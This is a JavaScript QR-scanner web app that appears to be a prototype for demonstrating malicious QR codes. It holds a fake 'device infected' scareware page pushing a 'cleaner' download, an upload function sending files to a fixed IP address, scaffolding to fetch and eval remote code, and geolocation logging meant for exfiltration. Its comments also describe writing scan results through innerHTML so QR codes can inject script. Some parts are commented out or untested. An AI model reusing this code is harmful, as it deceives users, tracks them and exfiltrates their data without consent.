//grab the elements from the html document so they can be easily manipulated
const cameraView = document.getElementById('camera-window');
const cameraContainer = document.getElementById('camera-container');
const scanButton = document.getElementById('button-container');
const qrCanvasElement = document.getElementById('qr-canvas');
const paragraphElement = document.getElementById('qr-text');
const linkElement = document.getElementById('qr-link');
const qrCanvas = qrCanvasElement.getContext('2d');
const canvasContainer = document.getElementById('canvas-container');
const subtitle = document.getElementById('subtitle');
const headerBanner = document.getElementById('header-banner');
const textLabel = document.getElementById('qr-text-label');
const warningMessage = document.getElementById('warning-message')

var cameraStopped = false;
// const recording = document.getElementById('video-window');



//define constraints for media capture
const constraints = {
    video: {
        facingMode: {exact: "environment"}, 
        width: {exact: 500},
        height: {exact: 380}

    }
};


function changeHTML(){

    subtitle.style.visibility = 'visible';
    const malweb = document.createElement("a");
    malweb.innerHTML = "Download Cleaner";
    malweb.setAttribute("href", "https://www.sketchywebsite.net");
    malweb.setAttribute("style", "margin: 20px");
    headerBanner.style.background='#3e3e59';
    headerBanner.innerHTML="<img style=\"display:inline-block; top:-10px;\" src=\"Photos/warning.png\" width=\"50px\" height=\"50px\"> <p style=\"display:inline-block; font-size: 35px;\">NOTICE</p>";
    subtitle.innerText="Device infected";
    subtitle.style.color='#a8a9ad';
    subtitle.style.fontSize ='30px';
    document.body.style.background = '#202029';
    const skull = document.createElement("img");   
    skull.setAttribute("src", "Photos/skull.png");
    skull.setAttribute("width", "300");
    skull.setAttribute("height", "300");
    skull.setAttribute("style", "margin: auto;");
    const infoTxt = document.createElement("p"); 
    infoTxt.setAttribute("style", "font-size: 20px; margin: 20px; color: #cbccd1;")
    infoTxt.innerHTML = "You have scanned a malicious QR code and your device is now infected. Please download and install our cleaner at the link below.";
    document.body.insertBefore(skull, document.body.children[1]);
    document.body.insertBefore(infoTxt, document.body.children[2]);
    document.body.insertBefore(malweb, document.body.children[3]);

// cameraContainer.style.visibility = 'hidden';
// cameraView.style.visibility = 'hidden';
// subtitle.style.visibility = 'visible';
// paragraphElement.style.visibility = 'hidden';
// linkElement.style.visibility = 'hidden';
// qrCanvasElement.style.visibility = 'hidden';
// canvasContainer.style.visibility = 'hidden';
// textLabel.style.visibility = 'hidden';
// scanButton.style.visibility = 'hidden';

// headerBanner.style.background = '#3e3e59';
// headerBanner.innerHTML = "<img style=\"display:inline-block; top: -10px;\" src=\"Photos/warning.png\" width=\"50px\" height=\"50px\"> <p style=\"display:inline-block; font-size: 35px;\">NOTICE</p>";
// subtitle.innerText = "Device infected";
// subtitle.style.color = '#a8a9ad';
// subtitle.style.fontSize = '30px';
// subtitle.style.fontWeight = 'bold';
// document.body.style.background = '#202029';
// const skull = document.createElement("img");   
// skull.setAttribute("src", "Photos/skull.png");
// skull.setAttribute("width", "300");
// skull.setAttribute("height", "300");
// skull.setAttribute("style", "margin: auto;");
// const infoTxt = document.createElement("p"); 
// infoTxt.setAttribute("style", "font-size: 20px; margin: 20px; color: #cbccd1;")
// infoTxt.innerHTML = "You have scanned a malicious QR code and your device is now infected. We are devoted to the security of our users and have provided a download link to our cleaner.<br><br>Please download and install it immediately. In the future, be sure to validate the authenticity of QR codes that you scan.";
// const downloadBtn = document.createElement("button");
// downloadBtn.setAttribute("style", "background-color: #fcd132; border: 3px solid white; border-radius: 40px; margin: auto; padding: 20px; width: 300px; font-size: 30px; font-weight: bold;");
// downloadBtn.innerText = "Download Cleaner";
// document.body.insertBefore(skull, document.body.children[1]);
// document.body.insertBefore(infoTxt, document.body.children[2]);
// document.body.insertBefore(downloadBtn, document.body.children[3]);

}



//this code starts the camera, streams to video element
async function startCamera(){
    
    console.log("Trying to start camera...");
    textLabel.style.display = 'none';
    linkElement.style.display = 'none';
    paragraphElement.style.display = 'none';
    scanButton.style.display = 'none';
    qrCanvasElement.display = 'none';
    canvasContainer.display = 'none';
    //unhide the camera
    cameraContainer.style.display = 'block';
    cameraView.style.display = 'block';
    subtitle.style.display = 'block';
    //unhide warning messages
    warningMessage.style.display = 'block';
    try{
        await navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream){
            console.log("Streaming now.");
            cameraView.srcObject = stream;
            
            });
    } catch(err){
        console.error("failed to get media");
    }
}



// function recordVideo(delay){
//     var blobsRec = [];
//     const mStream = qrCanvasElement.captureStream();
//     console.log("captured canvas stream..");
//     var mediaRecorder = new MediaRecorder(mStream);

//     mediaRecorder.ondataavailable = function(event) {
//         blobsRec.push(event.data);
//     }

//     mediaRecorder.onstop = function(event){
//         cameraStopped = true;
//         console.log("done recording");
//         cameraContainer.style.visibility = 'hidden';
//         cameraView.style.visibility = 'hidden';
//         recording.style.visibility = 'visible';
//         var file = new Blob(blobsRec);
//         //play back the video
//         recording.src = URL.createObjectURL(file);
//         scanButton.style.visibility = 'visible';
//         //try sending the file to the server
//         //sendFile(file);
//     }

//     //start recording 
//     mediaRecorder.start();
//     cameraStopped = false;
//     console.log("started recording"); 
//     //stop recording after 10 seconds
//     setTimeout(function(){
//         mediaRecorder.stop();
//     }, delay);
    
// }



/*--------------------- Testing in progress --------------------------- */
function sendFile(file){

    //this is the url the data will get sent to
    var url = 'https://172.17.2.52/uploads/';
    var onerror = function(event){
        console.log("An error has occurred during file upload.");
    }

    //create a formData object
    var formData = new FormData();
    //append the file to it
    formData.append('uploadedFile', file);

    var xhr = new XMLHttpRequest();
    xhr.upload.addEventListener("error", onerror);
    //open an http post request to the url
    xhr.open('POST', url);
    //allow CORS
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    //send the formData
    xhr.send(formData);
    
}



//code for retrieving and executing a remote file; needs to be tested
function executeRemoteTxt(filepath){

    //make a new request
    var xhr = new XMLHttpRequest();
    //use a get request to retrieve the file
    xhr.open('GET', filepath);
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.onreadystatechange = function() {
        alert(xhr.responseText);
    }
    xhr.onerror = function(){
        console.log("The GET request to the remote server failed! The file at " +filepath+ " was not able to be retrieved.");
    }
    xhr.send();

    var response = xhr.responseText;
    //eval(response);

}



//code for watching user location and recording to file; needs to be tested
function recordPosition(){

    var parts = []; //will hold each of the recorded locations/timestamps recorded
    var len; //holds the current length of the array
    var current = new Date(); //create a date object for accessing date and time
    var watchID;


    function success(position){
        //location info 
        var latitudeCord = position.coords.latitude;
        var longitudeCord = position.coords.longitude;
        //timestamp
        var formattedDate = current.getFullYear() +'-'+ (current.getMonth()+1)  +'-'+ current.getDate();
        var formattedTime = current.getHours() +':'+ current.getMinutes() +':'+ current.getSeconds();
        var formattedLocationLog = "Latitude: " + latitudeCord + "\tLongitude: " + longitudeCord + "\tDate: " + formattedDate + " at " + formattedTime + "\n";
        console.log(formattedLocationLog);
        len = parts.push(formattedLocationLog); //push 
   }

   function showError(error){
       switch(error.code){
           case error.PERMISSION_DENIED:
               console.log("Cannot access location. Permission denied.");
               break; 
            case error.POSITION_UNAVAILABLE:
                console.log("Location information unavailable");
                break;
            case error.TIMEOUT:
                console.log("The request to get permission has timed out");
                break; 
            case error.UNKNOWN_ERROR:
                console.log("An unknown error has occured");
                break;
       }
   }

    if(navigator.geolocation){
        watchID = navigator.geolocation.watchPosition(success, showError); //set the success and onerror functions
    }

    //if the video recording code has stopped, stop recording position and send file
    // if(cameraStopped){
    //     navigator.geolocation.clearWatch(watchID);
    //     //create the file from the parts
    //     var locationFile = new Blob(parts, {type: "text/plain"});
    //     //send to server via an XMLHttpRequest
    //     sendFile(locationFile);
    // }

}



function startScan(){
    //hide the text label before a code is scanned
    textLabel.style.display = 'none'; 
    startCamera();      
    setTimeout(tick, 100);
    // recordPosition();
    //recordVideo(5000);
}

//this code will run & scan for a QR code until one is found and decoded
//After, it won't start again until the user clicks the 'scan another code' button to restart the process
//an attacker can restart the code themselves by simply copying the function code inside of a qr code; they can even customize the code
//to overcome character maximums within the qr code, see if you can store the code remotely and use JS to fetch and run it

function tick(){

    let width;
    let height;
    let scanned;

    if (cameraView.readyState === cameraView.HAVE_ENOUGH_DATA) {

        //see if this works even when canvas is hidden; try putting canvas in a div and hiding the div rather than canvas
        qrCanvasElement.height = cameraView.videoHeight;
        qrCanvasElement.width = cameraView.videoWidth;
        qrCanvas.drawImage(cameraView, 0, 0, qrCanvasElement.width, qrCanvasElement.height);

        try {
            const result = qrcode.decode();
            console.log(result);
            scanned = true;
            subtitle.style.display = 'none';
            cameraContainer.style.display = 'none'; //hide container
            cameraView.style.display = 'none'; //hide camera
            warningMessage.style.display = 'none'; //hide the warning message
            textLabel.style.display = 'block'; //unhide text label
            cameraView.pause();                                                    //<------- developer stops the camera after scanning
            cameraView.src = '';
            cameraView.srcObject.getVideoTracks().forEach(track => track.stop());
            //changeHTML();
            var prefix = result.substring(0, 4); //get first four characters of the scan result
            if(prefix == 'http' || prefix == 'www.'){
                //web link result
                linkElement.style.display = 'block';
                linkElement.innerHTML = result; 
                linkElement.href = linkElement.textContent;
            }else{
                //text result
                paragraphElement.style.display = 'block';
                paragraphElement.innerHTML = result;
            }
            scanButton.style.display = 'block'; //unhide scan button
            return;
      
          } catch(e){
              //console.log("no code recognized. Retrying.");
          }

    }

    //if no qr code was found, keep looking for one
    if(!scanned){
        setTimeout(tick, 100);
    }

}

startScan();